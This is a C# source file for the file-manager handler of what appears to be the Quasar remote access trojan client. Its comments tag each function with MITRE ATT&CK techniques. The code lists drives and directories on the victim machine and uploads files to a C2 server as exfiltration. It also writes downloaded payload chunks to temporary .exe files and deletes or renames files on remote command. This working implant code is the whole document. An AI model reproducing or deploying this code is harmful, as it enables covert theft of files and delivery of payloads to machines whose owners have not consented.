using Quasar.Client.Networking;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Extensions;
using Quasar.Common.Helpers;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Logger;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Security;
using System.Threading;

namespace Quasar.Client.Messages
{
    public class FileManagerHandler : NotificationMessageProcessor, IDisposable
    {
        private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads

        private readonly QuasarClient _client;

        private CancellationTokenSource _tokenSource;

        private CancellationToken _token;

        public FileManagerHandler(QuasarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            switch (connected)
            {
                case true:

                    _tokenSource?.Dispose();
                    _tokenSource = new CancellationTokenSource();
                    _token = _tokenSource.Token;
                    break;
                case false:
                    // cancel all running transfers on disconnect
                    _tokenSource.Cancel();
                    break;
            }
        }

        public override bool CanExecute(IMessage message) => message is GetDrives ||
                                                             message is GetDirectory ||
                                                             message is FileTransferRequest ||
                                                             message is FileTransferCancel ||
                                                             message is FileTransferChunk ||
                                                             message is DoPathDelete ||
                                                             message is DoPathRename;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDrives msg:
                    Execute(sender, msg);
                    break;
                case GetDirectory msg:
                    Execute(sender, msg);
                    break;
                case FileTransferRequest msg:
                    Execute(sender, msg);
                    break;
                case FileTransferCancel msg:
                    Execute(sender, msg);
                    break;
                case FileTransferChunk msg:
                    Execute(sender, msg);
                    break;
                case DoPathDelete msg:
                    Execute(sender, msg);
                    break;
                case DoPathRename msg:
                    Execute(sender, msg);
                    break;
            }
        }

        /// <summary>
        /// Executes the GetDrives request for enumerating drive information on the local target.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1082: System Information Discovery
        /// </remarks>
        private void Execute(ISender client, GetDrives command)
        {
            Logger.Debug("Handling GetDrives command.");
            DriveInfo[] driveInfos;
            try
            {
                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException ex)
            {
                Logger.Error("IOException when handling GetDrives command: " + ex.ToString());
                client.Send(new SetStatusFileManager { Message = "GetDrives I/O error: " + ex.Message, SetLastDirectorySeen = false });
                return;
            }
            catch (UnauthorizedAccessException ex)
            {
                Logger.Error("UnauthorizedAccessException when handling GetDrives command: " + ex.ToString());
                client.Send(new SetStatusFileManager { Message = "GetDrives No permission", SetLastDirectorySeen = false });
                return;
            }

            if (driveInfos.Length == 0)
            {
                Logger.Debug("No drives found.");
                client.Send(new SetStatusFileManager { Message = "GetDrives No drives", SetLastDirectorySeen = false });
                return;
            }

            Drive[] drives = new Drive[driveInfos.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                try
                {
                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].VolumeLabel,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat)
                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat);

                    drives[i] = new Drive
                    { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                }
                catch (Exception ex)
                {
                    Logger.Error("Exception when handling GetDrives command: " + ex.ToString());
                }
            }

            client.Send(new GetDrivesResponse { Drives = drives });
        }

        /// <summary>
        /// Executes the GetDirectory request for enumerating a given directory.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1083: File and Directory Discovery
        /// </remarks>
        private void Execute(ISender client, GetDirectory message)
        {
            Logger.Debug("Handling GetDirectory command for " + message.RemotePath);
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(message.RemotePath);

                FileInfo[] files = dicInfo.GetFiles();
                DirectoryInfo[] directories = dicInfo.GetDirectories();

                FileSystemEntry[] items = new FileSystemEntry[files.Length + directories.Length];

                int offset = 0;
                for (int i = 0; i < directories.Length; i++, offset++)
                {
                    items[i] = new FileSystemEntry
                    {
                        EntryType = FileType.Directory,
                        Name = directories[i].Name,
                        Size = 0,
                        LastAccessTimeUtc = directories[i].LastAccessTimeUtc
                    };
                }

                for (int i = 0; i < files.Length; i++)
                {
                    items[i + offset] = new FileSystemEntry
                    {
                        EntryType = FileType.File,
                        Name = files[i].Name,
                        Size = files[i].Length,
                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
                        LastAccessTimeUtc = files[i].LastAccessTimeUtc
                    };
                }

                client.Send(new GetDirectoryResponse { TaskId = message.TaskId, RemotePath = message.RemotePath, Items = items, Keylogging = message.Keylogging });
            }
            catch (UnauthorizedAccessException ex)
            {
                Logger.Error("UnauthorizedAccessException when handling GetDirectory command: " + ex.ToString());
                onError("GetDirectory No permission");
            }
            catch (SecurityException ex)
            {
                Logger.Error("SecurityException when handling GetDirectory command: " + ex.ToString());
                onError("GetDirectory No permission");
            }
            catch (PathTooLongException ex)
            {
                Logger.Error("PathTooLongException when handling GetDirectory command: " + ex.ToString());
                onError("GetDirectory Path too long");
            }
            catch (DirectoryNotFoundException ex)
            {
                Logger.Error("DirectoryNotFoundException when handling GetDirectory command: " + ex.ToString());
                onError("GetDirectory Directory not found");
            }
            catch (FileNotFoundException ex)
            {
                Logger.Error("FileNotFoundException when handling GetDirectory command: " + ex.ToString());
                onError("GetDirectory File not found");
            }
            catch (IOException ex)
            {
                Logger.Error("IOException when handling GetDirectory command: " + ex.ToString());
                onError("GetDirectory I/O error: " + ex.Message);
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when handling GetDirectory command: " + ex.ToString());
                onError("GetDirectory Failed: " + ex.Message);
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = true });
            }
        }

        /// <summary>
        /// Executes the FileTransferRequest request for uploading a given file to the C2 server.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1041: Exfiltration Over C2 Channel<br/>
        /// - T1030: Data Transfer Size Limits
        /// </remarks>
        private void Execute(ISender client, FileTransferRequest message)
        {
            Logger.Debug(String.Format("Handling FileTransferRequest command for file {0} (ID {1})", message.RemotePath, message.Id));
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
                    {
                        _activeTransfers[message.Id] = srcFile;
                        OnReport("File upload started");
                        Logger.Debug("File upload started for " + message.RemotePath);
                        foreach (var chunk in srcFile)
                        {
                            if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(message.Id))
                                break;

                            // blocking sending might not be required, needs further testing
                            _client.SendBlocking(new FileTransferChunk
                            {
                                Id = message.Id,
                                FilePath = message.RemotePath,
                                FileSize = srcFile.FileSize,
                                Chunk = chunk,
                                Keylogging = message.Keylogging
                            });
                        }

                        client.Send(new FileTransferComplete
                        {
                            Id = message.Id,
                            FilePath = message.RemotePath,
                            Keylogging = message.Keylogging
                        });
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error("Exception when uploading file: " + ex.ToString());
                    client.Send(new FileTransferCancel
                    {
                        Id = message.Id,
                        Reason = "Error reading file: " + ex.Message,
                        Keylogging = message.Keylogging
                    });
                }
                finally
                {
                    RemoveFileTransfer(message.Id);
                    _limitThreads.Release();
                }
            }).Start();
        }

        private void Execute(ISender client, FileTransferCancel message)
        {
            Logger.Debug("Handling FileTransferCancel command for transfer ID " + message.Id);
            if (_activeTransfers.ContainsKey(message.Id))
            {
                RemoveFileTransfer(message.Id);
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "Canceled",
                    Keylogging = message.Keylogging
                });
            }
        }

        /// <summary>
        /// Executes the FileTransferChunk request for downloading a payload chunk from the C2 server
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1105: Ingress Tool Transfer
        /// </remarks>
        private void Execute(ISender client, FileTransferChunk message)
        {
            Logger.Debug("Handling FileTransferChunk request.");
            try
            {
                if (message.Chunk.Offset == 0)
                {
                    string filePath = message.FilePath;

                    if (string.IsNullOrEmpty(filePath))
                    {
                        // generate new temporary file path if empty
                        filePath = FileHelper.GetTempFilePath(".exe");
                        Logger.Debug("Saving file to temporary path " + filePath);
                    }

                    if (File.Exists(filePath))
                    {
                        // delete existing file
                        Logger.Debug("Deleting existing file " + filePath);
                        NativeMethods.DeleteFile(filePath);
                    }

                    _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
                    OnReport("File download started");
                    Logger.Debug("File download started for " + filePath);
                }

                if (!_activeTransfers.ContainsKey(message.Id))
                    return;

                var destFile = _activeTransfers[message.Id];
                destFile.WriteChunk(message.Chunk);

                if (destFile.FileSize == message.FileSize)
                {
                    Logger.Debug("File download complete for " + destFile.FilePath);
                    client.Send(new FileTransferComplete
                    {
                        Id = message.Id,
                        FilePath = destFile.FilePath
                    });
                    RemoveFileTransfer(message.Id);
                }
            }
            catch (Exception ex)
            {
                RemoveFileTransfer(message.Id);
                Logger.Error("Exception when handling FileTransferChunk request: " + ex.ToString());
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "Error writing file: " + ex.Message
                });
            }
        }

        /// <summary>
        /// Executes the DoPathDelete request for deleting a given file or directory, and then sends the updated directory listing.
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1070.004: Indicator Removal: File Deletion<br/>
        /// - T1083: File and Directory Discovery
        /// </remarks>
        private void Execute(ISender client, DoPathDelete message)
        {
            Logger.Debug("Handling DoPathDelete request for path " + message.Path);
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (message.PathType)
                {
                    case FileType.Directory:
                        Directory.Delete(message.Path, true);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Deleted directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Delete(message.Path);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Deleted file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }
                Logger.Debug("Deleted path " + message.Path);
                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.Path) });
            }
            catch (UnauthorizedAccessException ex)
            {
                Logger.Error("UnauthorizedAccessException when handling DoPathDelete request: " + ex.ToString());
                onError("DeletePath No permission");
            }
            catch (PathTooLongException ex)
            {
                Logger.Error("PathTooLongException when handling DoPathDelete request: " + ex.ToString());
                onError("DeletePath Path too long");
            }
            catch (DirectoryNotFoundException ex)
            {
                Logger.Error("DirectoryNotFoundException when handling DoPathDelete request: " + ex.ToString());
                onError("DeletePath Path not found");
            }
            catch (IOException ex)
            {
                Logger.Error("IOException when handling DoPathDelete request: " + ex.ToString());
                onError("DeletePath I/O error");
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when handling DoPathDelete request: " + ex.ToString());
                onError("DeletePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        private void Execute(ISender client, DoPathRename message)
        {
            Logger.Debug(String.Format("Handling DoPathRename request to rename {0} to {1}", message.Path, message.NewPath));
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (message.PathType)
                {
                    case FileType.Directory:
                        Directory.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Renamed directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Renamed file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }
                Logger.Debug(String.Format("Renamed {0} to {1}", message.Path, message.NewPath));
                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.NewPath) });
            }
            catch (UnauthorizedAccessException ex)
            {
                Logger.Error("UnauthorizedAccessException when handling DoPathRename request: " + ex.ToString());
                onError("RenamePath No permission");
            }
            catch (PathTooLongException ex)
            {
                Logger.Error("PathTooLongException when handling DoPathRename request: " + ex.ToString());
                onError("RenamePath Path too long");
            }
            catch (DirectoryNotFoundException ex)
            {
                Logger.Error("DirectoryNotFoundException when handling DoPathRename request: " + ex.ToString());
                onError("RenamePath Path not found");
            }
            catch (IOException ex)
            {
                Logger.Error("IOException when handling DoPathRename request: " + ex.ToString());
                onError("RenamePath I/O error");
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when handling DoPathRename request: " + ex.ToString());
                onError("RenamePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        private void RemoveFileTransfer(int id)
        {
            if (_activeTransfers.ContainsKey(id))
            {
                _activeTransfers[id]?.Dispose();
                _activeTransfers.TryRemove(id, out _);
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _tokenSource.Cancel();
                _tokenSource.Dispose();
                foreach (var transfer in _activeTransfers)
                {
                    transfer.Value?.Dispose();
                }

                _activeTransfers.Clear();
            }
        }
    }
}
